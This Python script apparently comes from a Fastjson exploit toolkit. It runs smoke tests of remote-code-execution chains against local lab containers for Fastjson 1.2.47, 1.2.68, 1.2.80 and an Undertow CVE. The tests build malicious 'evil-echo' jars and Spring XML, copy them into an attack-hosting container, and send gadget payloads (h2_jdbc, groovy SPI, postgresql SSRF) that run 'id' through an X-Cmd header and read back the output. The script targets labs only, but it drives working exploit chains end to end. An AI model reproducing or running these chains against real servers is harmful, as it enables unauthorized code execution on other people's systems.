"""各版本靶场回显冒烟：每版本一条最通用 RCE 链。

靶场端口（当前 compose 覆盖）：1247=18147, 1268=18168, 1280=18180, 16723=18083
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "src"))

from fastjson_toolkit.poc.cve_2026_16723.models import Poc16723Options
from fastjson_toolkit.poc.cve_2026_16723.service import run_cve_2026_16723
from fastjson_toolkit.poc.echo import build_echo_artifact, build_groovy_echo_jar, build_spring_echo_xml
from fastjson_toolkit.poc.v1_2_47.models import Poc1247SendOptions
from fastjson_toolkit.poc.v1_2_47.service import run_poc_1247
from fastjson_toolkit.poc.v1_2_68.models import Poc1268SendOptions
from fastjson_toolkit.poc.v1_2_68.service import run_poc_1268
from fastjson_toolkit.poc.v1_2_80.models import Poc1280SendOptions
from fastjson_toolkit.poc.v1_2_80.service import run_poc_1280

ATTACK_HOST = ROOT / "lab" / "fastjson-1280-lab" / "attack"


def _ok(name: str, cond: bool, detail: str) -> bool:
    mark = "PASS" if cond else "FAIL"
    print(f"[{mark}] {name}: {detail}")
    return cond


def _docker_cp(local: Path, container_path: str) -> None:
    subprocess.run(
        ["docker", "cp", str(local), container_path],
        check=True,
        capture_output=True,
    )


def test_1247(port: int = 18147) -> bool:
    """h2_jdbc（任意字节码）+ httpserver 回显。"""
    r = run_poc_1247(
        Poc1247SendOptions(
            gadget="h2_jdbc",
            echo=True,
            engine="httpserver",
            cmd="id",
            cmd_header="X-Cmd",
            target=f"http://127.0.0.1:{port}/api/fastjson",
            send=True,
            timeout=20,
        )
    )
    out = (r.echo_output or "").strip()
    return _ok(
        "1.2.47 h2_jdbc+httpserver",
        bool(out) and r.ok,
        f"http={r.status_code} echo={out[:120]!r}",
    )


def test_1280(port: int = 18180) -> bool:
    """groovy SPI + httpserver；容器内自拉 http://127.0.0.1:18080/attack/evil-echo.jar。"""
    ATTACK_HOST.mkdir(parents=True, exist_ok=True)
    jar_bytes, _ = build_groovy_echo_jar(
        engine="httpserver", cmd_header="X-Cmd", default_cmd="id"
    )
    local = ATTACK_HOST / "evil-echo.jar"
    local.write_bytes(jar_bytes)
    _docker_cp(local, "fastjson-1280-lab:/app/attack/evil-echo.jar")

    r = run_poc_1280(
        Poc1280SendOptions(
            gadget="groovy",
            echo=True,
            engine="httpserver",
            cmd="id",
            cmd_header="X-Cmd",
            attack_base="http://127.0.0.1:18080/attack",
            target=f"http://127.0.0.1:{port}/api/fastjson",
            send=True,
            reset_cache=True,
            timeout=30,
        )
    )
    out = (r.echo_output or "").strip()
    return _ok(
        "1.2.80 groovy+httpserver",
        bool(out) and r.ok,
        f"http={r.status_code} echo={out[:120]!r}",
    )


def test_1268(port: int = 18168) -> bool:
    """postgresql_ssrf：经 host.docker.internal 拉 1280 容器托管的 bean-echo.xml。"""
    ATTACK_HOST.mkdir(parents=True, exist_ok=True)
    art = build_echo_artifact(
        engine="httpserver",
        cmd_header="X-Cmd",
        default_cmd="id",
        banner="FJ1268-ECHO",
    )
    jar_url = "http://host.docker.internal:18180/attack/echo.jar"
    (ATTACK_HOST / "echo.jar").write_bytes(art.as_jar())
    (ATTACK_HOST / "bean-echo.xml").write_bytes(
        build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
    )
    _docker_cp(ATTACK_HOST / "echo.jar", "fastjson-1280-lab:/app/attack/echo.jar")
    _docker_cp(
        ATTACK_HOST / "bean-echo.xml", "fastjson-1280-lab:/app/attack/bean-echo.xml"
    )

    r = run_poc_1268(
        Poc1268SendOptions(
            gadget="postgresql_ssrf",
            echo=True,
            engine="httpserver",
            cmd="id",
            cmd_header="X-Cmd",
            attack_base="http://host.docker.internal:18180/attack",
            target=f"http://127.0.0.1:{port}/api/fastjson",
            send=True,
            timeout=40,
        )
    )
    out = (r.echo_output or "").strip()
    return _ok(
        "1.2.68 postgresql_ssrf+httpserver",
        bool(out) and r.ok,
        f"http={r.status_code} echo={out[:120]!r} summary={r.summary}",
    )


def test_16723(port: int = 18083) -> bool:
    """CVE-2026-16723 Undertow jar:http 回显。"""
    r = run_cve_2026_16723(
        Poc16723Options(
            target=f"http://127.0.0.1:{port}",
            mode="http",
            host="attacker",
            port=9192,
            cmd="id",
            echo=True,
            engine="undertow",
            docker_container="cve-2026-16723-undertow",
        )
    )
    joined = "\n".join(r.logs)
    has_echo = ("uid=" in joined) or ("echo output" in joined.lower())
    return _ok(
        "CVE-16723 undertow",
        bool(r.ok and has_echo),
        f"ok={r.ok} summary={r.summary}",
    )


def main() -> int:
    print("=== lab echo smoke ===")
    results = [
        test_1247(),
        test_1280(),
        test_1268(),
        test_16723(),
    ]
    passed = sum(1 for x in results if x)
    print(f"\n{passed}/{len(results)} passed")
    return 0 if all(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
